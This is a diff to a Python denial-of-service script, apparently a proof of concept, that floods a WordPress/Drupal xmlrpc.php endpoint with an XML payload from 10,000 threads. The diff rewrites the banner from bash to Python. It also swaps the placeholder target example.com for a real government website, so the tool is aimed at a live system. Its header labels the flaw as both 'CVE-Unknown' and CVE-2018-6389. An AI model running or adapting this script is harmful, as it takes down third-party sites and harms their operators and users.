@@ -1,21 +1,26 @@
 #!/usr/bin/env python3
 #################################################################################
 # CVE-Unknown Wordpress and Drupal XML Blowup Attack DoS
-# Author: Nahid 
+# Author: Nahid
 # This is a Proof of Concept Exploit, Please use responsibly.
 #################################################################################
-function banner() {
-    local width=56
 
-    echo "+--------------------------------------------------------+"
-    printf "|   %-${width}s |\n" "${grey}xmlrpc-ddos${default}"
-    printf "|   %-${width}s |\n" "${yellow}CVE-2018-6389${default}"
-    printf "|   %-${width}s |\n" "${red}Author: Nahid${default}"
-    printf "|   %-${width}s |\n" "${red}Link  : https://fumioryoto.github.io${default}"
-    printf "|   %-${width}s |\n" "${red}Usage : chmod +x main.sh${default}"
-    printf "|   %-${width}s |\n" "${red}Usage : ./main.sh <url>${default}"
-    echo "+--------------------------------------------------------+"
-}
+def banner():
+    grey = "\033[1;30m"
+    red = "\033[1;31m"
+    yellow = "\033[1;33m"
+    green = "\033[1;32m"
+    default = "\033[0m"
+
+    width = 56
+    print("+--------------------------------------------------------+")
+    print(f"|   {grey}{'xmlrpc-ddos':<{width}}{default} |")
+    print(f"|   {yellow}{'CVE-2018-6389':<{width}}{default} |")
+    print(f"|   {red}{'Author: Nahid':<{width}}{default} |")
+    print(f"|   {red}{'Link  : https://fumioryoto.github.io':<{width}}{default} |")
+    print(f"|   {red}{'Usage : python xmlrpcdos.py <url>':<{width}}{default} |")
+    print("+--------------------------------------------------------+")
+
 
 import threading
 import time
@@ -34,7 +39,7 @@ data = b"""<?xml version="1.0" encoding="iso-8859-1"?>
   </params>
 </methodCall>"""
 
-req = urllib.request.Request('https://example.com/xmlrpc.php', data=data)
+req = urllib.request.Request('https://jmc.gov.bd/xmlrpc.php', data=data)
 req.add_header('Accept', '*/*')
 req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
 req.add_header('Connection', '')
@@ -51,6 +56,7 @@ class MyThread(threading.Thread):
 
 
 if __name__ == '__main__':
+    banner()
     for x in range(10000):
         thread = MyThread(name="Thread-{}".format(x + 1))
         thread.start()
